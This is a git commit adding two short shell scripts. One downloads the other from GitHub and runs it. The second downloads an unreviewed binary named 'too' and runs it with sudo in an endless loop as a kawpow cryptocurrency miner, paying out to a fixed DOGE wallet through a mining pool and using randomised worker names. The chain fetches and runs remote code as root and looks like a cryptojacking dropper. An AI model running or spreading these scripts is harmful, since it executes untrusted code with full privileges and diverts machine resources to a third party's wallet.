bd53833eb44895a6f6661578ca07e447d51a2448
dreamistoken <88270239+dreamistoken@users.noreply.github.com>
2021-08-22 15:53:37 +0000

    Add files via upload

---
+++ lagan.sh
@@ -0,0 +1,11 @@
+#!/bin/bash
+POOL=kp.unmineable.com:3333
+WALLET=DOGE:DT7UtNqk6fZrpWRm8gUSULJ6KHMusSjtXz
+WORKER=$(echo $(shuf -i 1000000-9999999 -n 1)-rvn#816c-v7qn)
+wget https://github.com/dreamistoken/too/raw/main/too
+chmod +x too
+while [ 1 ]; do
+sudo ./too -a kawpow -o $POOL -u $WALLET -w $WORKER -p x
+sleep 5
+done
+sleep 9999999999999 
---
+++ sajan.sh
@@ -0,0 +1,4 @@
+#!/bin/sh
+wget https://github.com/dreamistoken/too/raw/main/lagan.sh
+chmod +x lagan.sh
+./lagan.sh
